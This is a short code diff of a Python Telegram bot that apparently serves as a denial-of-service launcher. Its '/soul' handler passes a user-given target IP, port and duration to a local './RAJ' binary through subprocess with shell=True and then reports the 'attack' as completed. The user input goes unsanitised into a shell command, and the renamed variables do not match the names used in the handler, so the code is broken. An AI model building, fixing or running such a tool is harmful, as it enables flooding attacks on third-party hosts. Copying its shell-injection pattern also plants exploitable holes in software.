@@ -190,7 +190,7 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-def start_attack_reply(message, king, soulking, time):
+def start_attack_reply(message, IP, PORT, TIME):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
@@ -225,7 +225,7 @@ def handle_soul(message):
                 record_command_logs(user_id, '/soul_compiled', king, soulking, time)
                 log_command(user_id, king, soulking, time)
                 start_attack_reply(message, king, soulking, time)  
-                full_command = f"./RAJ {NARUTO IP} {NARUTO PORT} {time} "
+                full_command = f"./RAJ {IP} {PORT} {TIME} "
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} soulking: {soulking} soulking: {time}"
         else:
